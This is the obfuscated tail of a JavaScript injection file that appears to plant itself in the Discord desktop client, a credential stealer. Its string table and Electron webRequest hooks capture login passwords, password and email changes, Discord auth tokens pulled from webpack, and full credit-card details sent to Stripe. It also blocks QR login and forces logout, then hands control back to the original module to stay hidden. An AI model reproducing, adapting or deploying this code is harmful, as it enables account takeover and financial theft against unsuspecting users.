        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "```\x0a**Badges:**```",
        "logout",
        "208HKjqzi",
        "https://discord.com/api/v*/users/@me/library",
        "```Hostname:\x20\x0a",
        "onCompleted",
        "User\x20Login",
        "%LOGOUT%",
        "264056jIsHjz",
        "`<a:420_cross:931468716779114536>`",
        "filter",
        "content-security-policy",
        "```\x0a**Country:\x20**```",
        "window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();",
        "<a:pepe_nitro:906950345983397988>\x20Nitro",
        "<:partner:874750808678354964>\x20",
        "%DISABLEQRCODE%",
        "statusCode",
        "\x0a```",
        "<:staff_blue:936543701294010399>\x20Password",
        "2452KsaCRf",
        "Badges",
        "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "disable-qr-code",
        "\x0aInjection\x20Info:\x20\x0a",
        "```\x0a**City:\x20**```",
        "forEach",
        "includes",
        "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "`✔️`\x20:credit_card:",
        "Nitro",
        "```\x0a**Nitro\x20Type:**```",
        "https://api.stripe.com/v*/tokens",
        "querystring",
        "getAllWindows",
        "uploadData",
        "88330GcdhAH",
        "webRequest",
        "<:PP_director:942527310324719716>\x20New\x20Email",
        "266145PyTltu",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20",
        "executeJavaScript",
        "password",
        "webContents",
        "invalid",
        "https://*.discord.com/api/v*/users/@me/library",
        "Info",
        "https://*.discord.com/api/v*/auth/login",
        "<:bughunter_2:874750808430874664>\x20",
        "exports",
        "https://discordapp.com/api/v*/users/@me",
        "\x0aIP:\x20\x0a",
        "24306Njpyeh",
        "PATCH",
        "content-security-policy-report-only",
        "card[address_state]",
        "card[cvc]",
        "https://discord.com/api/v*/auth/login",
        "users/@me",
        "```\x0a**Token:**```",
        "endsWith",
        "209hqnFhd",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp=new\x20XMLHttpRequest;xmlHttp.open(\x22GET\x22,\x22https://discord.com/api/v8/users/@me\x22,!1),xmlHttp.setRequestHeader(\x22Authorization\x22,\x22",
        "135PCWTXy",
        "user",
        "for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;",
        "startsWith",
        "Token",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "None",
        "discriminator",
        "<a:early:925791052512788551>\x20",
        "defaultSession",
        "https://discord.com/api/v*/applications/detectable",
        "from",
        "<:staff:874750808728666152>\x20",
        "https://ibb.co/V2KcYZB",
        "card[address_city]",
        "card[number]",
        "https://cdn.discordapp.com/avatars/",
        "\x22),xmlHttp.send(null),xmlHttp.responseText;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
        "%INITNOTI%",
        "<a:420_cross:931468716779114536>",
        "toString",
        "username",
        "stringify",
        "new_password",
        "https://ibb.co/nmDLGCT",
        "then",
        "%LOGOUTNOTI%",
        "<:bughunter_1:874750808426692658>\x20",
        "avatar",
        "`✔️`\x20<:paypal:896441236062347374>",
        "responseHeaders",
        "init",
        "`❌`",
        "<a:allbadges:895906088996720690>\x20\x20Badges",
    ];
    _0x4e94 = function () {
        return _0x40d07c;
    };
    return _0x4e94();
}
session[_0x3b3019(0x12e)][_0x3b3019(0x1a1)][_0x3b3019(0x175)](Filter, (_0x42af00, _0x550729) => {
    const _0x20893f = _0x3b3019;
    !_0x42af00[_0x20893f(0x179)][_0x20893f(0x128)]("wss://") || (_0x20893f(0x177) != config[_0x20893f(0x193)] && _0x20893f(0x18c) != config[_0x20893f(0x193)]) ? (FirstTime(), _0x550729({})) : _0x550729({ cancel: !0x0 });
});
const ChangePasswordFilter = { urls: [_0x3b3019(0x174), _0x3b3019(0x118), _0x3b3019(0x16d), "https://discordapp.com/api/v*/auth/login", _0x3b3019(0x11f), _0x3b3019(0x1ab), _0x3b3019(0x19c)] };
session["defaultSession"]["webRequest"][_0x3b3019(0x181)](ChangePasswordFilter, (_0x51bba6, _0x143fa8) => {
    const _0x3bf5af = _0x3b3019;
    if (_0x51bba6[_0x3bf5af(0x179)][_0x3bf5af(0x122)](_0x3bf5af(0x14d)) && 0xc8 == _0x51bba6[_0x3bf5af(0x18d)]) {
        const _0x487b93 = JSON[_0x3bf5af(0x151)](Buffer[_0x3bf5af(0x130)](_0x51bba6["uploadData"][0x0][_0x3bf5af(0x153)])["toString"]()),
            _0x3c67d5 = _0x487b93[_0x3bf5af(0x14d)],
            _0x274a4e = _0x487b93[_0x3bf5af(0x1a6)];
        BrowserWindow[_0x3bf5af(0x19e)]()[0x0]
            ["webContents"][_0x3bf5af(0x1a5)](_0x3bf5af(0x127), !0x0)
            [_0x3bf5af(0x13e)]((_0x28d8f7) => {
                Login(_0x3c67d5, _0x274a4e, _0x28d8f7);
            });
    }
    if (_0x51bba6["url"][_0x3bf5af(0x122)](_0x3bf5af(0x120)) && 0xc8 == _0x51bba6[_0x3bf5af(0x18d)] && _0x3bf5af(0x11b) == _0x51bba6["method"]) {
        const _0x4cddec = JSON[_0x3bf5af(0x151)](Buffer[_0x3bf5af(0x130)](_0x51bba6[_0x3bf5af(0x19f)][0x0][_0x3bf5af(0x153)])["toString"]());
        null != _0x4cddec[_0x3bf5af(0x1a6)] &&
            null != _0x4cddec["password"] &&
            "" != _0x4cddec[_0x3bf5af(0x1a6)] &&
            (null != _0x4cddec[_0x3bf5af(0x13c)] &&
                null != _0x4cddec["new_password"] &&
                "" != _0x4cddec[_0x3bf5af(0x13c)] &&
                BrowserWindow[_0x3bf5af(0x19e)]()[0x0]
                    [_0x3bf5af(0x1a7)]["executeJavaScript"](_0x3bf5af(0x127), !0x0)
                    [_0x3bf5af(0x13e)]((_0x13c0bb) => {
                        const _0x41e7bf = _0x3bf5af;
                        ChangePassword(_0x4cddec["password"], _0x4cddec[_0x41e7bf(0x13c)], _0x13c0bb);
                    }),
            null != _0x4cddec[_0x3bf5af(0x170)] &&
                null != _0x4cddec[_0x3bf5af(0x170)] &&
                "" != _0x4cddec["email"] &&
                BrowserWindow[_0x3bf5af(0x19e)]()[0x0]
                    [_0x3bf5af(0x1a7)]["executeJavaScript"](_0x3bf5af(0x127), !0x0)
                    [_0x3bf5af(0x13e)]((_0x2e3e20) => {
                        const _0x401d8e = _0x3bf5af;
                        ChangeEmail(_0x4cddec[_0x401d8e(0x170)], _0x4cddec["password"], _0x2e3e20);
                    }));
    }
    if (_0x51bba6[_0x3bf5af(0x179)][_0x3bf5af(0x122)](_0x3bf5af(0x173))) {
        const _0x2116cf = BrowserWindow[_0x3bf5af(0x19e)]()[0x0],
            _0x4cca37 = querystring[_0x3bf5af(0x151)](decodeURIComponent(Buffer[_0x3bf5af(0x130)](_0x51bba6[_0x3bf5af(0x19f)][0x0][_0x3bf5af(0x153)])[_0x3bf5af(0x139)]()));
        _0x2116cf[_0x3bf5af(0x1a7)][_0x3bf5af(0x1a5)](_0x3bf5af(0x127), !0x0)["then"]((_0x50a40d) => {
            const _0x52e946 = _0x3bf5af;
            CreditCardAdded(
                _0x4cca37[_0x52e946(0x134)],
                _0x4cca37[_0x52e946(0x11e)],
                _0x4cca37["card[exp_month]"],
                _0x4cca37[_0x52e946(0x168)],
                _0x4cca37["card[address_line1]"],
                _0x4cca37[_0x52e946(0x133)],
                _0x4cca37[_0x52e946(0x11d)],
                _0x4cca37[_0x52e946(0x169)],
                _0x4cca37["card[address_country]"],
                _0x50a40d
            );
        });
    }
}),
    (module[_0x3b3019(0x117)] = require(_0x3b3019(0x165)));
